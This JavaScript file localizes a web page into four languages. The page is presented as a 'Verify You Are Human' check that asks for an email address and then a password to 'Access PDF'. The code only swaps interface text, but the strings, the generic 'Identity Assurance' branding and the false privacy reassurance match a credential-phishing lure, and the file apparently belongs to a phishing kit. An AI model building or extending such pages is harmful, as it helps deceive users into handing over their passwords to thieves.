const translations = {
    en: {
        headerTitle: 'Verify You Are Human',
        instructionText: 'Please enter your email address to continue.',
        emailLabel: 'Email Address',
        continueBtn: 'Continue',
        noticeTitle: 'Important Notice',
        noticeText: 'This page verifies human users. Your email is used only for access validation and is not stored permanently. By clicking "Continue", you consent to this verification process.',
        privacyText: 'Privacy Protected',
        copyrightText: '© 2025 Identity Assurance',
        emailError: 'Please enter a valid email address',
        placeholder: 'user@business.com',
        pageTitle: 'Enter Password',
        passwordLabel: 'Password',
        accessBtn: 'Access PDF',
        passwordError: 'Please enter a password',
        redirectText: 'Redirecting...'
    },
    es: {
        headerTitle: 'Verificar que eres humano',
        instructionText: 'Por favor ingresa tu dirección de correo electrónico para continuar.',
        emailLabel: 'Dirección de Correo',
        continueBtn: 'Continuar',
        noticeTitle: 'Aviso Importante',
        noticeText: 'Esta página verifica usuarios humanos. Tu correo se utiliza solo para validación de acceso y no se almacena permanentemente. Al hacer clic en "Continuar", aceptas este proceso de verificación.',
        privacyText: 'Privacidad Protegida',
        copyrightText: '© 2025 Identity Assurance',
        emailError: 'Por favor ingresa un correo electrónico válido',
        placeholder: 'usuario@empresa.com',
        pageTitle: 'Ingresa Contraseña',
        passwordLabel: 'Contraseña',
        accessBtn: 'Acceder PDF',
        passwordError: 'Por favor ingresa una contraseña',
        redirectText: 'Redirigiendo...'
    },
    fr: {
        headerTitle: 'Vérifier que vous êtes humain',
        instructionText: 'Veuillez entrer votre adresse e-mail pour continuer.',
        emailLabel: 'Adresse E-mail',
        continueBtn: 'Continuer',
        noticeTitle: 'Avis Important',
        noticeText: 'Cette page vérifie les utilisateurs humains. Votre e-mail est utilisé uniquement pour la validation d\'accès et n\'est pas stocké de manière permanente. En cliquant sur "Continuer", vous consentez à ce processus de vérification.',
        privacyText: 'Confidentialité Protégée',
        copyrightText: '© 2025 Identity Assurance',
        emailError: 'Veuillez entrer une adresse e-mail valide',
        placeholder: 'utilisateur@entreprise.com',
        pageTitle: 'Entrer le Mot de Passe',
        passwordLabel: 'Mot de Passe',
        accessBtn: 'Accéder PDF',
        passwordError: 'Veuillez entrer un mot de passe',
        redirectText: 'Redirection...'
    },
    zh: {
        headerTitle: '验证您是人类',
        instructionText: '请输入您的电子邮件地址以继续。',
        emailLabel: '电子邮件地址',
        continueBtn: '继续',
        noticeTitle: '重要通知',
        noticeText: '此页面验证人类用户。您的电子邮件仅用于访问验证，不会永久存储。点击"继续"即表示您同意此验证流程。',
        privacyText: '隐私保护',
        copyrightText: '© 2025 Identity Assurance',
        emailError: '请输入有效的电子邮件地址',
        placeholder: 'user@business.com',
        pageTitle: '输入密码',
        passwordLabel: '密码',
        accessBtn: '访问PDF',
        passwordError: '请输入密码',
        redirectText: '重定向...'
    }
};

function setLanguage(lang) {
    localStorage.setItem('preferredLanguage', lang);
    
    if (document.getElementById('headerTitle')) {
        document.getElementById('headerTitle').textContent = translations[lang].headerTitle;
    }
    if (document.getElementById('instructionText')) {
        document.getElementById('instructionText').textContent = translations[lang].instructionText;
    }
    if (document.getElementById('emailLabel')) {
        document.getElementById('emailLabel').textContent = translations[lang].emailLabel;
    }
    if (document.getElementById('continueBtn')) {
        document.getElementById('continueBtn').textContent = translations[lang].continueBtn;
    }
    if (document.getElementById('noticeTitle')) {
        document.getElementById('noticeTitle').textContent = translations[lang].noticeTitle;
    }
    if (document.getElementById('noticeText')) {
        document.getElementById('noticeText').textContent = translations[lang].noticeText;
    }
    if (document.getElementById('privacyText')) {
        document.getElementById('privacyText').textContent = translations[lang].privacyText;
    }
    if (document.getElementById('copyrightText')) {
        document.getElementById('copyrightText').textContent = translations[lang].copyrightText;
    }
    if (document.getElementById('emailError')) {
        document.getElementById('emailError').textContent = translations[lang].emailError;
    }
    if (document.getElementById('email')) {
        document.getElementById('email').placeholder = translations[lang].placeholder;
    }
    if (document.getElementById('pageTitle')) {
        document.getElementById('pageTitle').textContent = translations[lang].pageTitle;
    }
    if (document.getElementById('passwordLabel')) {
        document.getElementById('passwordLabel').textContent = translations[lang].passwordLabel;
    }
    if (document.getElementById('accessBtn')) {
        document.getElementById('accessBtn').textContent = translations[lang].accessBtn;
    }
    if (document.getElementById('passwordError')) {
        document.getElementById('passwordError').textContent = translations[lang].passwordError;
    }
    if (document.getElementById('redirectText')) {
        document.getElementById('redirectText').textContent = translations[lang].redirectText;
    }
    
    document.querySelectorAll('.lang-btn')?.forEach(btn => {
        btn.classList.remove('active');
        if (btn.dataset.lang === lang) {
            btn.classList.add('active');
        }
    });
    
    window.currentLanguage = lang;
}

document.addEventListener('DOMContentLoaded', function() {
    const preferredLang = localStorage.getItem('preferredLanguage') || 'en';
    setLanguage(preferredLang);
});
